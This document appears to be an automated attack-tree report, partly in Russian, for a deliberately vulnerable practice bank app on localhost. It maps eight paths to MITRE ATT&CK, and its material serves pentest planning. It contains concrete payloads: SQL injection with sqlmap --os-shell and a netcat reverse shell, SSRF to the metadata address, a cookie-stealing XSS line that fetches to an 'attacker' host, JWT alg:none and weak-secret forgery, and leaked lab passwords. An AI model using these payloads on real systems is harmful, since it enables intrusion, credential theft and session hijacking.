# VulnBank — Attack Tree (MITRE ATT&CK)
**Сгенерировано:** attack-path-architect by orizon.one | 2026-04-12

---

## Карта целей

```
                        ┌──────────────────────────────┐
                        │   ATTACKER (no credentials)  │
                        └──────────────┬───────────────┘
                                       │
              ┌────────────────────────┼────────────────────────┐
              │                        │                        │
              ▼                        ▼                        ▼
   ┌──────────────────┐    ┌──────────────────┐    ┌──────────────────┐
   │  localhost:5050  │    │ localhost:5050   │    │ localhost:5432   │
   │    WEB_APP       │    │   /graphql  API  │    │   DATABASE       │
   │  score: 8.2      │    │   score: 8.2     │    │   score: 8.2     │
   └────────┬─────────┘    └────────┬─────────┘    └────────┬─────────┘
            │                       │                        │
    ┌───────┴───────┐        ┌──────┴──────┐       ┌────────┴────────┐
    │               │        │             │        │                 │
    ▼               ▼        ▼             ▼        ▼                 ▼
 SQLi→RCE      SSRF→Creds  BOLA→Data  GraphQL→   Direct          :5000
  [8.2]         [7.8]       [8.2]     Schema[8.2] psql[8.2]    Internal API
                                                               BOLA [8.2]
```

---

## Attack Paths (по combined score)

### PATH-01 · SQL Injection → RCE · score 8.2
**Target:** `localhost:5050` (WEB_APP) · F:8 I:9 S:7

```
[Initial Access]     T1190  Exploit Public-Facing Application
  └─ Fuzz parameters → POST /login username injectable
         ↓
[Initial Access]     T1190  Extract data via SQL injection
  └─ error-based: ' AND 1=CAST((SELECT string_agg(...)) AS int)--
         ↓
[Execution]          T1059  Escalate to OS command (INTO OUTFILE / xp_cmdshell)
  └─ Tools: sqlmap --os-shell
         ↓
[Execution]          T1059.004  Establish reverse shell
  └─ Tools: netcat, bash
```

---

### PATH-02 · BOLA/IDOR → Data Exfiltration · score 8.2
**Target:** `localhost:5050/graphql` (API) · F:9 I:8 S:7

```
[Initial Access]     T1190  Map API endpoints
  └─ GET /static/openapi.json → 32 endpoints + object refs
         ↓
[Initial Access]     T1190  Test horizontal privilege escalation
  └─ GET /check_balance/{acct} без auth → 200 OK
         ↓
[Collection]         T1213  Enumerate and exfiltrate
  └─ for acct in accounts: GET /transactions/{acct}
```

---

### PATH-03 · GraphQL Introspection → Schema Leak · score 8.2
**Target:** `localhost:5050/graphql` (API) · F:10 I:7 S:7

```
[Initial Access]     T1190  Send introspection query
  └─ POST /graphql {"query": "{__schema{types{name fields{name}}}}"}
         ↓
[Collection]         T1213  Map all queries/mutations/types
  └─ Обнаружен transactionSummary(accountNumber) — SQLi вектор
         ↓
[Initial Access]     T1190  Identify sensitive mutations
  └─ transferMoney, adminDeleteUser, etc.
         ↓
[Privilege Escalation] T1548  Test auth on privileged mutations
  └─ Отсутствует проверка роли → доступно любому auth пользователю
```

---

### PATH-04 · Direct DB Access · score 8.2
**Target:** `localhost:5432` (DATABASE) · F:7 I:10 S:7

```
[Initial Access]     T1133  Connect to exposed PostgreSQL port
  └─ psql -h localhost -p 5432
         ↓
[Credential Access]  T1110  Test default credentials
  └─ postgres:postgres123 (получен через SSRF → /internal/secret)
         ↓
[Collection]         T1213  Enumerate databases and tables
  └─ \dt → users, transactions, loans
         ↓
[Exfiltration]       T1048  Dump all data
  └─ COPY users TO '/tmp/dump.csv'
```

---

### PATH-05 · Admin Panel Compromise · score 8.2
**Target:** `localhost:5050/sup3r_s3cr3t_admin` (ADMIN_PANEL) · F:8 I:9 S:7

```
[Initial Access]     T1190  Identify admin panel
  └─ GET /sup3r_s3cr3t_admin → 401 / login form
         ↓
[Credential Access]  T1110  Test default/weak credentials
  └─ Bypass: forged JWT с secret "secret123" (из SSRF)
         ↓
[Initial Access]     T1078  Access admin functionality
  └─ HTTP 200 → Full admin panel
         ↓
[Execution]          T1059  RCE via admin (file upload / template)
  └─ Platform-specific
```

---

### PATH-06 · SSRF → Cloud Credential Theft · score 7.8
**Target:** `localhost:5050` (WEB_APP) · F:7 I:9 S:7

```
[Initial Access]     T1190  Identify SSRF vector
  └─ POST /upload_profile_picture_url параметр url
         ↓
[Credential Access]  T1552.005  Access cloud metadata
  └─ url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
     [На локальном Docker: url=http://127.0.0.1:5000/internal/secret → CONFIRMED]
         ↓
[Credential Access]  T1552  Extract credentials
  └─ jwt_secret=secret123, db_password=postgres123
         ↓
[Initial Access]     T1078.004  Use stolen credentials
  └─ Forge JWT → admin access
```

---

### PATH-07 · XSS → Session Hijacking · score 7.4
**Target:** `localhost:5050` (WEB_APP) · F:9 I:6 S:7

```
[Initial Access]     T1190  Find stored XSS
  └─ POST /update_bio {"bio": "<img src=x onerror=alert(document.cookie)>"}
         ↓
[Credential Access]  T1539  Steal session cookie
  └─ <img src=x onerror="fetch('https://attacker/'+document.cookie)">
         ↓
[Lateral Movement]   T1550  Use stolen session
  └─ Set-Cookie: token=<stolen_jwt> → доступ к аккаунту жертвы
```

---

### PATH-08 · JWT Manipulation · score 7.0
**Target:** `localhost:5050` (WEB_APP) · F:6 I:8 S:7

```
[Credential Access]  T1552  Intercept JWT
  └─ Любой токен из /login response
         ↓
[Initial Access]     T1190  Test none algorithm bypass
  └─ {"alg":"none","typ":"JWT"} + {"is_admin":true} + пустая подпись
         ↓
[Initial Access]     T1190  Test key confusion RS256→HS256
         ↓
[Credential Access]  T1110  Brute-force weak secret
  └─ hashcat -a 0 -m 16500 token.jwt wordlist.txt → "secret123"
         ↓
[Initial Access]     T1078  Forge admin JWT
  └─ jwt.encode({"is_admin":True}, "secret123", algorithm="HS256")
```

---

## MITRE ATT&CK Coverage Matrix

| Tactic | TTPs | Paths |
|--------|------|-------|
| Initial Access | T1078, T1078.004, T1133, T1190 | 01,02,03,04,05,06,07,08 |
| Credential Access | T1110, T1539, T1552, T1552.005 | 04,05,06,07,08 |
| Execution | T1059, T1059.004 | 01,05 |
| Collection | T1213 | 02,03,04 |
| Privilege Escalation | T1548 | 03 |
| Lateral Movement | T1550 | 07 |
| Exfiltration | T1048 | 04 |

**Покрытие:** 7 тактик / 13 уникальных TTP

---

## Recommended Testing Order

| # | Target | Attack | Score |
|---|--------|--------|-------|
| 1 | localhost:5050 | SQL Injection to RCE | **8.2** |
| 2 | localhost:5050/graphql | BOLA/IDOR to Data Exfiltration | **8.2** |
| 3 | localhost:5050/graphql | GraphQL Introspection → Schema Leak | **8.2** |
| 4 | localhost:5000 | BOLA/IDOR to Data Exfiltration | **8.2** |
| 5 | localhost:5432 | Direct Database Access | **8.2** |
| 6 | localhost:5050/sup3r_s3cr3t_admin | Admin Panel Compromise | **8.2** |
| 7 | localhost:5050 | SSRF → Cloud Credential Theft | 7.8 |
| 8 | localhost:5050 | XSS → Session Hijacking | 7.4 |
| 9 | localhost:5050 | JWT Manipulation | 7.0 |
